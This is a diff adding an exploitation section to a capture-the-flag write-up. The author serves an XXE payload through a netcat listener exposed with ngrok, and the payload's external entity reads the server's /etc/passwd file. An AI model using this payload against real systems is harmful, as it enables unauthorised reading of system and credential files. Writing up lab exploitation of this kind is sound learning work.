@@ -196,6 +196,24 @@ Flag-:```PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}```
 
 ![image](https://github.com/user-attachments/assets/bd0c7878-bb4c-4b39-b8a1-887294612fe0)
 
+### Exploitation
+
+- My first attempt in exploiting was to read the server's `/etc/passwd` file.I set up a mock netcat listening server to serve an http resposnse containing a json content as seen below.I tunneled to the internet with `ngrok`.
+
+      ❯ cat index.html
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=UTF-8
+      Server: netcat!
+      
+      {"Comment":"<!DOCTYPE foo [<!ENTITY example SYSTEM '/etc/passwd'> ]>\n<p>&example;</p>"}
+
+![image](https://github.com/user-attachments/assets/7f347995-322c-40d7-8090-538d54650c58)
+
+- Now, we can load our malicious url with curl,don't forget to protect `ctrl+c` to end our nc connection.The payload worked,I was able to read the `/etc/passwd` file.Local file read achieved
+
+![image](https://github.com/user-attachments/assets/28d64d48-c0d4-40fd-9ed2-931f98d71926)
+
+-
 
 
 
